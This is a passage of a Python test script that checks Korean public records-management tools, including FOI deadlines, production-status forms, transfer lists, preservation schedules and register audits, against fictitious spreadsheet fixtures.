                           ["F-2", "김가상", "2026-11-02", "", "", "", "", "", "", "", ""],
                           ["F-3", "이가상", "2026-10-01", "2026-10-14", "2026-10-27", "비공개", "6호", "", "", "2026-11-03", ""],
                           ["F-4", "박가상", "2026-11-12", "", "", "", "", "", "", "", ""]])
    code, out = run([S("access-request", "scripts", "foi_deadlines.py"), f"{t}/청구.xlsx", "--today", "2026-11-19",
                     "-o", f"{t}/산출/foi.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/foi.xlsx")
    d = {r[0]: r for r in wb["결정 기한"].iter_rows(min_row=2, values_only=True)}
    chk_txt = " ".join(str(r[2]) for r in wb["결정 점검"].iter_rows(min_row=2, values_only=True))
    flat = " ".join(str(c) for ws in wb.worksheets for r in ws.iter_rows(values_only=True) for c in r if c)
    hol = "holidays" in out
    ok_foi = (d["F-1"][2] == "2026-10-01" and d["F-1"][5] == "기한 내 처리" and d["F-2"][5] == "기한 초과 7일"
              and d["F-3"][2] == "2026-10-12" and d["F-3"][3] == "2026-10-22" and d["F-3"][5] == "기한 넘겨 처리"
              and (d["F-4"][2] == "2026-11-23") and "구체적 이유" in chk_txt and "연장 통지일" in chk_txt
              and list(wb["이의신청"].iter_rows(min_row=2, values_only=True))[0][5] == "기한 초과 9일"
              and "홍가상" not in flat)
    check("정보공개: 10일·연장·말일 휴일 이월·이의 7일·사유 결함·청구인 미기재" + ("" if hol else " (holidays 없음: 주말만)"), ok_foi, out)

    xlsx(f"{t}/청구2.xlsx", [["접수번호", "청구일", "결정일", "결정", "제3자통지일", "제3자비공개요청", "공개일"],
                            ["G-1", "2026-09-01", "2026-09-10", "공개", "2026-09-03", "Y", "2026-09-20"],
                            ["G-2", "2026-10-26", "", "", "", "", ""]])
    code, out = run([S("access-request", "scripts", "foi_deadlines.py"), f"{t}/청구2.xlsx", "--today", "2026-11-19", "-o", f"{t}/산출/foi2.xlsx"])
    txt2 = " ".join(str(r[2]) for r in openpyxl.load_workbook(f"{t}/산출/foi2.xlsx")["결정 점검"].iter_rows(min_row=2, values_only=True))
    check("정보공개: 제3자 요청 시 30일 간격(제21조③)·결정 없이 20일 경과(제18조①)", "30일 간격 미달" in txt2 and "이의신청 가능" in txt2, txt2)
    xlsx(f"{t}/청구3.xlsx", [["접수번호", "청구일", "연장통지일", "연장사유", "결정일", "결정", "이의신청일", "이의결정일", "심의회개최", "미개최사유"],
                            ["H-1", "2026-09-01", "2026-09-10", "제3자 의견청취 필요", "2026-09-20", "공개", "", "", "", ""],
                            ["H-2", "2026-09-01", "2026-09-10", "", "2026-09-20", "공개", "", "", "", ""],
                            ["H-3", "2026-09-01", "2026-09-10", "담당자 출장", "2026-09-20", "공개", "", "", "", ""],
                            ["H-4", "2026-09-01", "", "", "2026-09-08", "비공개", "2026-09-20", "2026-09-25", "N", ""],
                            ["H-5", "2026-09-01", "", "", "2026-09-08", "비공개", "2026-09-20", "2026-09-25", "N", "단순 반복 청구"]])
    run([S("access-request", "scripts", "foi_deadlines.py"), f"{t}/청구3.xlsx", "--today", "2026-11-19", "-o", f"{t}/산출/foi3.xlsx"])
    r3 = {}
    for r_ in openpyxl.load_workbook(f"{t}/산출/foi3.xlsx")["결정 점검"].iter_rows(min_row=2, values_only=True):
        r3.setdefault(r_[0], []).append(str(r_[2]))
    check("정보공개 연장 사유(시행령 제7조)·이의신청 심의회 미개최 사유(법 제18조②)",
          not any("연장 사유" in x for x in r3.get("H-1", [])) and any("비어 있음" in x for x in r3.get("H-2", [])) and any("네 가지" in x for x in r3.get("H-3", []))
          and any("미개최 사유" in x for x in r3.get("H-4", [])) and not any("심의회" in x for x in r3.get("H-5", [])), str(r3))

    xlsx(f"{t}/등록정보.xlsx", [["생산부서", "생산연도", "단위과제", "보존기간", "기록물형태", "유형", "공개구분", "등록번호", "제목", "쪽수", "실물쪽수", "비밀구분"],
                               ["행정과", 2025, "기록관리", "10년", "전자", "일반문서", "공개", "행정과-1", "가상 계획", 3, "", ""],
                               ["행정과", 2025, "기록관리", "영구", "비전자", "일반문서", "비공개", "행정과-2", "가상 대장", 40, 38, ""],
                               ["행정과", 2025, "", "5 년", "전자", "일반문서", "", "", "가상 보고", 2, "", ""],
                               ["총무과", 2025, "인사", "3년", "전자", "일반문서", "공개", "총무과-1", "가상 공문", 1, "", ""],
                               ["총무과", 2025, "인사", "3년", "전자", "일반문서", "공개", "총무과-1", "가상 공문2", 1, "", ""],
                               ["총무과", 2025, "보안", "30년", "전자", "일반문서", "비공개", "총무과-9", "가상비밀제목", 5, "", "Ⅲ급"],
                               ["총무과", 2024, "인사", "3년", "전자", "일반문서", "공개", "총무과-0", "작년 문서", 1, "", ""]])
    code, out = run([S("production-status-report", "scripts", "production_status.py"), f"{t}/등록정보.xlsx", "--year", "2025",
                     "-o", f"{t}/산출/prod.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/prod.xlsx")
    tot = list(wb["부서×보존기간"].iter_rows(values_only=True))[-1]
    iss = " ".join(str(r[2]) for r in wb["고칠 것"].iter_rows(min_row=2, values_only=True))
    flat = " ".join(str(c) for ws in wb.worksheets for r in ws.iter_rows(values_only=True) for c in r if c)
    ok_ps = (tot[-1] == 5 and "쪽수 불일치" in iss and "등록번호 없음" in iss and "중복" in iss and "단위과제 없음" in iss
             and "가상비밀제목" not in flat and "작년 문서" not in flat)
    check("생산현황: 대상연도 집계·쪽수 불일치·등록번호 누락/중복·비밀 제목 미기재", ok_ps, out)

    open(f"{t}/폐기금지.txt", "w", encoding="utf-8").write("# 가상 폐기 금지 통보\nD2\n제목:행정소송\n")
    out_h = f"{t}/산출/평가심의_금지"
    code, out = run([S("disposal-dossier", "scripts", "build_dossier.py"), f"{t}/만료목록.xlsx", "--year", "2026",
                     "--hold", f"{t}/폐기금지.txt", "-o", out_h])
    ids_h = [r[1] for r in openpyxl.load_workbook(f"{out_h}/평가심의서.xlsx")["심의 대상"].iter_rows(min_row=3, values_only=True) if r[1]]
    held = [r[1] for r in openpyxl.load_workbook(f"{out_h}/폐기금지_제외.xlsx")["심의 대상"].iter_rows(min_row=3, values_only=True) if r[1]]
    check("폐기 금지: 통보 목록(번호·제목 낱말) 기록물을 심의 대상에서 제외(시행령 제54조의4)",
          ids_h == ["D1"] and sorted(held) == ["D2", "D3"], f"{ids_h} {held} {out}")

    # 이관목록 서식(별지 제2호)
    xlsx(f"{t}/이관등록.xlsx", [["철분류번호", "철제목", "단위과제", "등록번호", "제목", "쪽수", "기록물형태", "공개구분", "공개제한쪽", "비고", "비밀구분", "관리단위"],
        ["F-1", "가상 민원철", "민원", "행정과-1", "민원 1", 12, "종이", "공개", "", "", "", ""],
        ["F-1", "가상 민원철", "민원", "행정과-2", "민원 2", 8, "종이", "부분공개", "3-4", "", "", ""],
        ["F-2", "가상 계획철", "계획", "행정과-3", "계획", 5, "전자", "공개", "", "", "", ""],
        ["F-3", "가상 도면", "시설", "행정과-4", "도면 A", 1, "종이", "비공개", "", "대형", "", "건"],
        ["F-4", "가상비밀철", "보안", "행정과-5", "가상비밀건", 3, "종이", "비공개", "", "", "Ⅲ급", ""]])
    code, out = run([S("transfer-reconcile", "scripts", "make_transfer_list.py"), f"{t}/이관등록.xlsx", "--org", "가상시 행정과(1234567)",
                     "--year", "2026", "-o", f"{t}/산출/이관목록.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/이관목록.xlsx")
    f1 = {r[0]: r for r in wb["1. 기록물철 단위"].iter_rows(min_row=6, values_only=True) if r[0] and str(r[0]).startswith("F-")}
    f2 = [r for r in wb["2. 건 단위"].iter_rows(min_row=6, values_only=True) if r[0] and str(r[0]).startswith("행정과")]
    flat = " ".join(str(c) for ws in wb.worksheets for r in ws.iter_rows(values_only=True) for c in r if c)
    check("이관목록(별지 제2호): 철 건수·종이만 쪽수·건 단위·비밀 제외",
          f1["F-1"][2] == 2 and f1["F-1"][3] == 20 and f1["F-2"][3] in (None, "") and len(f2) == 1 and f2[0][4] == "F-3"
          and "가상비밀" not in flat, f"{f1} {f2}")

    # 정수점검·상태검사(별표 14)
    xlsx(f"{t}/보존현황.xlsx", [["관리번호", "제목", "유형", "상태등급", "최근정수점검", "최근상태검사", "생산연도"],
        ["A1", "가상 대장", "종이", 3, 2025, 2015, 1990], ["A2", "가상 사진", "사진", "", 2023, 2010, 2000],
        ["A3", "가상 테이프", "비디오테이프", "", 2024, 2022, 2005], ["A4", "가상 문서", "종이", "", "", "", 2010],
        ["A5", "가상 LTO", "전자매체", "", 2025, 2021, 2020], ["A6", "가상 그림", "유화", "", 2025, 2020, 1950]])
    code, out = run([S("preservation-inspection", "scripts", "inspection_schedule.py"), f"{t}/보존현황.xlsx", "--year", "2026",
                     "-o", f"{t}/산출/점검일정.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/점검일정.xlsx")
    sch = {r[0]: r for r in wb["점검 일정"].iter_rows(min_row=2, values_only=True)}
    need = [r[1] for r in wb["확인 필요"].iter_rows(min_row=2, values_only=True)]
    check("정수점검·상태검사(별표 14): 등급별·매체별 주기와 지남·예정·확인 필요",
          sch["A1"][9] == 2025 and sch["A2"][6] == 2025 and sch["A2"][9] == 2020 and sch["A3"][9] == 2025 and sch["A5"][9] == 2026
          and "지남" in sch["A2"][10] and sorted(need) == ["A4", "A6"], f"{sch} {need}")
    xlsx(f"{t}/보존현황2.xlsx", [["관리번호", "제목", "유형", "재질", "보존기간", "상태등급", "최근정수점검", "최근상태검사", "생산연도"],
        ["P1", "가상 팩스 기록", "종이", "감열지", "영구", "", 2025, "", 1995], ["P2", "가상 문서", "종이", "", "10년", "", 2025, "", 2020],
        ["P3", "가상 녹화", "비디오테이프", "", "준영구", "", 2025, "", 1985]])
    run([S("preservation-inspection", "scripts", "inspection_schedule.py"), f"{t}/보존현황2.xlsx", "--year", "2026", "-o", f"{t}/산출/점검일정2.xlsx"])
    pr = [r for r in openpyxl.load_workbook(f"{t}/산출/점검일정2.xlsx")["첫 상태검사 우선순위"].iter_rows(min_row=2, values_only=True) if r[0]]
    check("첫 상태검사 우선순위(기록물 상태검사 지침 2025): 영구·준영구·오래된 것·취약 재질 먼저",
          [r[2] for r in pr][:3] == ["P3", "P1", "P2"] and "감열" in str(pr[1][7]), str(pr))

    # 정리 점검(시행규칙 제14조)
    xlsx(f"{t}/정리등록.xlsx", [["철분류번호", "제목", "생산연도", "보존기간", "단위과제", "쪽수", "공개구분", "비공개사유", "접근권한", "비밀구분", "기록물형태"],
        ["F1", "가상 민원철", "2025", "5년", "민원", "20", "공개", "", "", "", "종이"],
        ["F2", "가상 계획철", "2025", "10년", "계획", "10", "비공개", "내부 검토", "", "", "종이"],
        ["F3", "홍가상 010-1234-5678 상담", "2025", "5년", "민원", "5", "공개", "", "", "", "종이"],
        ["F4", "Ⅲ급 비밀 가상보고", "2025", "30년", "보안", "3", "비공개", "2호 국가안보", "부서", "", "종이"],
        ["F5", "전자 보고", "2025", "3년", "보고", "2", "공개", "", "", "", "전자"],
        ["F6", "없어진 철", "2025", "5년", "민원", "7", "", "", "", "", "종이"]])
    xlsx(f"{t}/실물점검.xlsx", [["상자번호", "철분류번호", "실물쪽수", "등록번호표기"],
        ["B1", "F1", "18", "Y"], ["B1", "F2", "10", "N"], ["B1", "F3", "5", "Y"], ["B2", "F9", "4", "Y"], ["B2", "F4", "3", "Y"]])
    code, out = run([S("records-register-audit", "scripts", "register_audit.py"), f"{t}/정리등록.xlsx", f"{t}/실물점검.xlsx",
                     "-o", f"{t}/산출/정리점검.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/정리점검.xlsx")
    res = [(r[0], r[2], r[3]) for r in wb["점검 결과"].iter_rows(min_row=2, values_only=True)]
    kinds = {(k, n) for k, n, _ in res}
    flat = " ".join(str(c) for ws in wb.worksheets for r in ws.iter_rows(values_only=True) for c in r if c)
    check("정리 점검(제14조): 미등록·실물 없음·쪽수·번호 표기·공개/비밀·상자 혼재, 전자는 실물 대조 제외",
          {("미등록 실물", "F9"), ("실물 없음", "F6"), ("쪽수 불일치", "F1"), ("등록번호 표기 없음", "F2")} <= kinds
          and ("실물 없음", "F5") not in kinds and any(k == "상자 혼재" and b == "B1" for k, _, b in res)
          and any(k == "공개·비밀 점검" and n == "F3" for k, n, _ in res) and "가상보고" not in flat, str(res))

    # HWPX 보고서·서식 채움
    try:
        if importlib.util.find_spec("hwpx") is None:
            raise ImportError("hwpx")
        os.makedirs(f"{t}/hw", exist_ok=True)
        open(f"{t}/hw/보고.md", "w", encoding="utf-8").write("# 가상 결과 보고\n\n## 1. 개요\n\n가상 문단입니다.\n\n- 항목 하나\n\n| 부서 | 건수 |\n|---|---|\n| 행정과 | 3 |\n")
        import warnings as _w
        _w.filterwarnings("ignore")
        from hwpx.document import HwpxDocument as _D
        import importlib.metadata as _md
        if int(_md.version("python-hwpx").split(".")[0]) >= 7 and importlib.util.find_spec("hwpx_automation") is None:
            raise ImportError("python-hwpx 7.0은 마크다운 변환이 python-hwpx-automation으로 빠짐")
        _d = _D.new()
        _d.add_paragraph("수신  {{수신}}")
        _tb = _d.add_table(1, 2)
        _tb.set_cell_text(0, 0, "담당자")
        (_d.save_to_path if hasattr(type(_d), "save_to_path") else _d.save)(f"{t}/hw/서식.hwpx")
        open(f"{t}/hw/값.csv", "w", encoding="utf-8").write("키,값\n수신,가상시 기록관장\n칸:담당자,기록연구사 김가상\n")
        c1, o1 = run([S("hwpx-report", "scripts", "make_hwpx.py"), "--md", f"{t}/hw/보고.md", "-o", f"{t}/hw/보고.hwpx"])
        c2, o2 = run([S("hwpx-report", "scripts", "make_hwpx.py"), "--template", f"{t}/hw/서식.hwpx", "--values", f"{t}/hw/값.csv",
                      "--md", f"{t}/hw/보고.md", "-o", f"{t}/hw/공문.hwpx"])
        c3, o3 = run([S("hwpx-report", "scripts", "make_hwpx.py"), "--md", f"{t}/hw/보고.md", "-o", f"{t}/hw/보고.hwpx"])
        txt = _D.open(f"{t}/hw/공문.hwpx").text.plain()
        check("HWPX: 마크다운→HWPX·자리표시·칸 채움·스키마 통과·덮어쓰기 거부",
              c1 == 0 and c2 == 0 and c3 == 2 and "가상시 기록관장" in txt and "기록연구사 김가상" in txt and "{{" not in txt, o1 + o2 + o3)
    except ImportError:
        check("HWPX: python-hwpx 없음 — 건너뜀", True)

    # 기록관리기준표 점검(NAK 4:2025)
    sh = ["단위과제코드", "단위과제명", "처리과", "소기능", "업무설명", "보존기간", "보존기간책정사유", "비치여부", "비치사유", "비치기간",
          "보존장소", "보존방법", "공개여부", "비공개사유", "공개재검토시점", "접근권한"]
    good = ["가상 민원 접수부터 처리 결과 통지까지의 처리 절차와 이력 관리", "10년", "별표 1 10년 제1호 주요업무로 5년 초과 10년 이하 참고 필요",
            "미비치", "", "", "기록관", "원본 그대로", "공개", "", "", "목록 및 원문 열람"]
    xlsx(f"{t}/기준표.xlsx", [sh,
        ["U1", "가상 민원처리", "민원과", "민원", *good],
        ["U2", "가상 토지대장", "지적과", "지적", "가상 토지 소유·지목 변동을 대장으로 관리하는 업무", "영구", "필요", "비치", "", "7년",
         "기록관", "원본 보존", "비공개", "개인정보", "", "목록만 열람"],
        ["U3", "가상 회의", "", "회의", "회의", "7년", "", "미비치", "", "", "기록관", "스캔", "공개", "", "", "전부"],
        ["U4", "가상 도로 민간투자사업", "도로과", "도로", *good]])
    xlsx(f"{t}/기준표_전년.xlsx", [sh, ["U1", "가상 민원처리", "민원과", "민원", good[0], "5년", *good[2:]]])
    code, out = run([S("records-schedule-check", "scripts", "schedule_check.py"), f"{t}/기준표.xlsx", "--previous", f"{t}/기준표_전년.xlsx",
                     "-o", f"{t}/산출/기준표점검.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/기준표점검.xlsx")
    items = {(r[1], r[3]) for r in wb["점검 결과"].iter_rows(min_row=2, values_only=True)}
    notice = {(r[0], r[2]) for r in wb["고시 대상"].iter_rows(min_row=2, values_only=True) if r[0] and r[2]}
    want = {("U2", "책정 사유"), ("U2", "비치사유"), ("U2", "비치기간"), ("U2", "보존장소"), ("U2", "공개여부"),
            ("U3", "보존기간"), ("U3", "책정 사유"), ("U3", "업무설명"), ("U3", "처리과"), ("U3", "보존방법"), ("U3", "접근권한"), ("U4", "보존기간")}
    check("기준표 점검(NAK 4): 관리항목 7개·보존장소 30년 규칙·대규모 투자사업 준영구·고시 대상(신설·변경)",
          want <= items and not any(k == "U1" for k, _ in items) and notice == {("U1", "보존기간 변경"), ("U2", "신설"), ("U3", "신설"), ("U4", "신설")},
          f"{sorted(items - want)} {sorted(want - items)} {notice}")

    xlsx(f"{t}/기준표유사.xlsx", [sh,
        ["V1", "민원처리", "민원과", "민원", *good], ["V2", "민원 처리 관리", "민원과", "민원", good[0], "5년", *good[2:]],
        ["V3", "청사 시설 관리", "총무과", "청사", *good], ["V4", "청사시설관리", "총무과", "청사", *good], ["V5", "예산편성", "기획과", "예산", *good]])
    cs_, os_ = run([S("records-schedule-check", "scripts", "schedule_check.py"), f"{t}/기준표유사.xlsx", "-o", f"{t}/산출/기준표유사.xlsx"])
    simr = [r for r in openpyxl.load_workbook(f"{t}/산출/기준표유사.xlsx")["유사 단위과제"].iter_rows(min_row=2, values_only=True)]
    pairs = {(r[0], r[3]): r[7] for r in simr if r[0]}
    check("기준표 유사·중복 단위과제(자치단체 기준표 빅데이터 연구): 보존기간 다른 유사 과제·중복 생성 의심", "보존기간 다름" in str(pairs.get(("V1", "V2")))
          and "중복" in str(pairs.get(("V3", "V4"))) and not any("V5" in k for k in pairs), os_ + str(pairs))
    xlsx(f"{t}/기준표정비.xlsx", [["단위과제코드", "단위과제명", "처리과", "기능유형", "단위과제카드", "업무설명", "보존기간", "보존기간책정사유", "생산건수"],
        ["T1", "업무계획및성과관리", "가과", "과단위공통", "정책 및 학술 연구과제 관리", "업무계획", "5년", "별표1", "12"],
        ["T2", "서무", "가과", "과단위공통", "서무", "서무", "3년", "별표1", "0"],
        ["T3", "지역발전 기본계획 수립", "나과", "기관고유", "지역발전 기본계획 수립", "지역발전 기본계획을 수립", "10년", "별표1", "3"]])
    cfx, ofx = run([S("records-schedule-check", "scripts", "schedule_check.py"), f"{t}/기준표정비.xlsx", "-o", f"{t}/산출/기준표정비.xlsx"])
    fxs = " ".join(str(c) for r in openpyxl.load_workbook(f"{t}/산출/기준표정비.xlsx")["정비 문제유형"].iter_rows(values_only=True) for c in r if c)
    check("기준표 정비 문제유형(중앙 기준표 개선 지원 사업): ① 고유 과제 없음·①-1 카드 분리·③ 무기록·⑥ 과소 책정",
          "① 고유업무 있으나" in fxs and "①-1" in fxs and "③ 무기록" in fxs and "⑥ 보존기간 과소" in fxs and "나과" not in fxs.split("⑥")[0].split("①")[0], ofx + fxs[:500])

    # 국가기록원 공식 생산현황 통보서식 채우기
    form = S("production-status-report", "assets", "2024년도기록물생산현황통보서식.xlsx")
    ps = [["철분류번호", "철제목", "등록번호", "건제목", "생산부서", "처리과코드", "단위과제ID", "단위과제명", "생산연도", "보존기간", "기록물형태", "유형", "공개구분", "비밀구분"]]
    ps += [["F1", "가상 계획철", "행정-1", "계획1", "행정과", "1234567", "T1", "기획", "2025", "영구", "전자", "일반문서", "공개", ""],
           ["F1", "가상 계획철", "행정-2", "계획2", "행정과", "1234567", "T1", "기획", "2025", "영구", "전자", "일반문서", "공개", ""],
           ["F2", "가상 민원철", "행정-3", "민원1", "행정과", "1234567", "T2", "민원", "2025", "5년", "비전자", "일반문서", "공개", ""],
           ["F3", "가상 혼합철", "행정-4", "혼합1", "행정과", "1234567", "T3", "보고", "2025", "30년", "전자", "일반문서", "공개", ""],
           ["F3", "가상 혼합철", "행정-5", "혼합2", "행정과", "1234567", "T3", "보고", "2025", "30년", "비전자", "일반문서", "공개", ""],
           ["F4", "가상 도면", "행정-6", "도면1", "시설과", "1234568", "T4", "시설", "2025", "준영구", "비전자", "도면", "공개", ""],
           ["F5", "가상비밀철", "행정-7", "가상비밀건", "보안과", "1234569", "T5", "보안", "2025", "30년", "비전자", "일반문서", "비공개", "Ⅲ급"]]
    ps += [[f"L{i}", "가상 장기철", f"행정-L{i}", "장기", "행정과", "1234567", "T9", "장기", "2025", "30년", "전자", "일반문서", "공개", ""] for i in range(10)]
    xlsx(f"{t}/생산등록.xlsx", ps)
    code, out = run([S("production-status-report", "scripts", "fill_official_form.py"), f"{t}/생산등록.xlsx", "--form", form, "--year", "2025",
                     "-o", f"{t}/산출/통보서식.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/통보서식.xlsx")
    f1 = wb["서식 1"]
    l21 = [wb["서식 2-1"].cell(r, 8).value for r in range(6, 20)]
    flat = " ".join(str(c) for ws in wb.worksheets for r in ws.iter_rows(values_only=True) for c in r if c)
    same_sheets = wb.sheetnames == openpyxl.load_workbook(form).sheetnames
    check("공식 통보서식: 서식 1 칸(전자·비전자·혼합·도면 × 보존기간)·서식 2-1 30년 이상 13철(행 추가)·비밀 제외·시트 그대로",
          f1["E8"].value == 1 and f1["F8"].value == 2 and f1["I8"].value == 10 and f1["M9"].value == 1 and f1["I10"].value == 1
          and f1["J10"].value == 2 and f1["G11"].value == 1 and len([x for x in l21 if x]) == 13 and "가상비밀" not in flat and same_sheets
          and "2025.1.1." in str(f1["A2"].value), out)

    xlsx(f"{t}/시청각.xlsx", [["생산부서", "등록일시", "건제목", "유형구분", "매체형태", "건수", "수량", "등록번호", "내용요약", "공개구분", "비공개사유", "단위과제명", "보존기간", "비고"],
        ["홍보과", "2025-03-02", "가상 행사 사진", "사진/필름류", "디지털", "1", "30", "홍보-1", "행사", "공개", "", "홍보", "영구", ""],
        ["홍보과", "2025-05-02", "가상 브리핑 영상", "녹음/동영상류", "디지털", "1", "1", "홍보-2", "브리핑", "공개", "", "홍보", "30년", ""]])
    xlsx(f"{t}/회의.xlsx", [["회의명", "회의종류", "개최방식", "회의록건수", "속기록건수"],
        ["가상 위원회 1차", "5", "대면", "1", "1"], ["가상 위원회 2차", "5", "서면", "1", "0"], ["가상 간부회의", "", "대면", "1", "0"]])
    code, out = run([S("production-status-report", "scripts", "fill_official_form.py"), f"{t}/생산등록.xlsx", "--form", form, "--year", "2025",
                     "--av", f"{t}/시청각.xlsx", "--meetings", f"{t}/회의.xlsx", "-o", f"{t}/산출/통보서식2.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/통보서식2.xlsx")
    w3, w4, w8 = wb["서식 3"], wb["서식 4"], wb["서식 8"]
    check("공식 통보서식: 서식 3 시청각 유형×보존기간·서식 4 목록·서식 8 회의 종류×방식×회의록/속기록·종류 번호 없음 확인",
          w3["D5"].value == 1 and w3["F6"].value == 1 and w4.cell(5, 4).value == "가상 행사 사진" and w4.cell(6, 4).value == "가상 브리핑 영상"
          and [w8[f"{c}10"].value for c in "CDFG"] == [1, 1, 2, 1] and [w8[f"{c}14"].value for c in "CDFG"] == [1, 0, 1, 0] and "종류 번호 없음" in out, out)

    # 공통업무 준칙(1,329개)으로 보존기간 점검·단위과제 추천
    import csv as _csv
    cc = list(_csv.DictReader(open(S("retention-review", "assets", "common", "common_task_criteria.csv"), encoding="utf-8-sig")))
    xlsx(f"{t}/준칙목록.xlsx", [["관리번호", "제목", "단위과제명", "보존기간", "종료년도"], ["C1", "가상 감사", "감사실시", "5년", "2023"]])
    code, out = run([S("retention-review", "scripts", "check_retention.py"), f"{t}/준칙목록.xlsx", "--common", "중앙행정기관", "--year", "2026",
                     "-o", f"{t}/산출/준칙점검.xlsx"])
    ck = list(openpyxl.load_workbook(f"{t}/산출/준칙점검.xlsx")["보존기간 점검"].iter_rows(min_row=2, values_only=True))
    xlsx(f"{t}/제목들.xlsx", [["제목", "보존기간"], ["2025년 상반기 종합감사 결과 보고", "5년"], ["ㅁㅁㅁ", ""]])
    code2, out2 = run([S("task-suggest", "scripts", "suggest_task.py"), f"{t}/제목들.xlsx", "--common", "중앙행정기관", "-o", f"{t}/산출/후보.xlsx"])
    sg = [r for r in openpyxl.load_workbook(f"{t}/산출/후보.xlsx").active.iter_rows(min_row=2, values_only=True) if r[3] == 1]
    check("공통업무 준칙: 1,329개 표·retention --common 대조·task-suggest 1순위·후보 약함",
          len(cc) == 1329 and ck and ck[0][4] == "10년" and sg[0][4] == "감사실시" and "확인" in (sg[0][11] or "") and "약함" in (sg[1][11] or ""),
          f"{len(cc)} {ck} {sg} {out2}")

    # 평가 준비 점검(2026년 '25년 실적)
    xlsx(f"{t}/증빙.xlsx", [["제목", "등록번호", "등록일자", "결재"],
        ["2025년 기록관리 기본계획 수립", "기록관-11", "2025-02-03", "Y"], ["2025년 기록물 생산현황 통보", "기록관-120", "2025-08-20", "Y"],
        ["기록물평가심의회 심의 결과 보고", "기록관-300", "2026-01-10", "Y"], ["직원 기록관리 교육 실시 결과", "", "2025-06-01", ""]])
    code, out = run([S("evaluation-readiness", "scripts", "eval_readiness.py"), f"{t}/증빙.xlsx", "--type", "공공기관", "--from", "2025-01-01",
                     "--to", "2025-12-31", "--select", "3-1,3-5,3-6,3-7,3-8", "-o", f"{t}/산출/평가.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/평가.xlsx")
    ind = {r[0]: r for r in wb["지표별 준비"].iter_rows(min_row=2, values_only=True)}
    fm = {r[1]: r[3] for r in wb["증빙 형식 점검"].iter_rows(min_row=2, values_only=True)}
    sel = " ".join(str(c) for r in wb["선택지표·원칙"].iter_rows(values_only=True) for c in r if c)
    check("평가 준비: 필수지표 연결·증빙 없음·평가기준일 밖·등록번호 없음·선택지표 5개 초과·배점 초과",
          ind["1-1"][4] == 1 and ind["1-2"][7] == "증빙 없음" and "평가기준일" in fm["기록물평가심의회 심의 결과 보고"]
          and "등록번호 없음" in fm["직원 기록관리 교육 실시 결과"] and "최대 4개" in sel and "20점 이하" in sel
          and ind["1-2"][8] == "78.4" and ind["3-8"][8] == "100.0", out)

    # 데이터세트 관리기준표 초안
    import sqlite3
    dbp = f"{t}/가상.sqlite"
    con = sqlite3.connect(dbp)
    con.execute("create table tb_civil_m(id int, title text, reg_date date, end_date date, jumin_enc text)")
    con.execute("create table tb_civil_attach(id int, file_path text, img blob)")
    con.execute("create table tb_staff_info(id int, name text, rtdate date)")
    con.commit()
    con.close()
    code, out = run([S("dataset-schedule", "scripts", "dataset_schedule.py"), dbp, "--org", "가상시", "--system", "가상 민원시스템", "--dbms", "SQLite",
                     "-o", f"{t}/산출/데이터세트.xlsx"])
    dr = {(r[0], r[1]): r[2] for r in openpyxl.load_workbook(f"{t}/산출/데이터세트.xlsx").active.iter_rows(min_row=3, values_only=True)}
    check("데이터세트 관리기준표: 6개 영역·업무DB 묶음·비정형·암호화 후보·적용 범위·기산일 후보(종료일 우선)",
          dr[("3. 시스템정보", "업무 DB명")] == "civil, staff" and "img(BLOB)" in dr[("4. 데이터정보", "비정형 데이터 종류·저장방법")]
          and "jumin_enc" in dr[("4. 데이터정보", "암호화 데이터 사용유무")] and dr[("6. 기록관리정보 [civil]", "적용 범위")] == "tb_civil_m, tb_civil_attach"
          and dr[("6. 기록관리정보 [civil]", "기산일")].startswith("후보: tb_civil_m.end_date") and not dr[("6. 기록관리정보 [civil]", "보존기간")], out)

    # 회의록·시청각 점검(2026년 기록물관리 지침)
    os.makedirs(f"{t}/회의록", exist_ok=True)
    open(f"{t}/회의록/가상위원회_제1차.txt", "w", encoding="utf-8").write(
        "회의명: 가상위원회 2025년도 제1차 회의\n주관부서: 가상과\n일시: 2025. 3. 4. 14:00 장소: 본관 회의실\n참석자: 위원장 외 6명, 배석자: 간사\n"
        "진행순서: 개회-안건 심의-폐회\n안건: 제1호 가상 계획(안)\n위원장: 의견을 말씀해 주십시오. 위원: 찬성합니다.\n결정사항: 원안 가결(표결 7:0)\n")
    open(f"{t}/회의록/가상회의_메모.txt", "w", encoding="utf-8").write("가상 간부회의 메모\n논의: 일정 공유\n")
    xlsx(f"{t}/생산의무회의.xlsx", [["회의명", "개최일"], ["가상위원회", ""], ["가상심의회", "2025-05-01"]])
    code, out = run([S("typed-records-check", "scripts", "minutes_check.py"), f"{t}/회의록", "--meetings", f"{t}/생산의무회의.xlsx", "-o", f"{t}/산출/회의록.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/회의록.xlsx")
    mm = {r[0]: r for r in wb["구성 요소"].iter_rows(min_row=2, values_only=True)}
    mt = {r[0]: r[2] for r in wb["생산의무 회의 대조"].iter_rows(min_row=2, values_only=True)}
    xlsx(f"{t}/시청각등록.xlsx", [["등록번호", "제목", "유형", "쪽수", "내용요약"],
        ["홍보-1", "가상 행사 사진", "사진·필름류", "2", "2025. 3. 2. 본관 강당에서 열린 가상 행사, 가상시장 인사말"],
        ["홍보-2", "가상 영상", "동영상", "1", "행사 영상"]])
    os.makedirs(f"{t}/시청각원본", exist_ok=True)
    for fn in ("홍보-1_01.jpg", "홍보-1_02.jpg", "홍보-1_03.jpg", "홍보-2_01.mp4"):
        open(f"{t}/시청각원본/{fn}", "wb").write(b"x")
    code2, out2 = run([S("typed-records-check", "scripts", "av_check.py"), f"{t}/시청각등록.xlsx", "--files", f"{t}/시청각원본", "-o", f"{t}/산출/시청각.xlsx"])
    av = {r[1]: r[8] for r in openpyxl.load_workbook(f"{t}/산출/시청각.xlsx").active.iter_rows(min_row=2, values_only=True)}
    check("회의록 8요소·생산의무 회의 대조, 시청각 유형·생산일자·장소·쪽수=파일 수",
          mm["가상위원회_제1차.txt"][9] == 0 and mm["가상회의_메모.txt"][9] >= 5 and mt["가상위원회"] == "회의록 있음" and "못 찾음" in mt["가상심의회"]
          and "쪽수 2 ≠ 파일 3" in av["홍보-1"] and "유형" in av["홍보-2"] and "생산(촬영)일자" in av["홍보-2"], out + out2 + str(av))

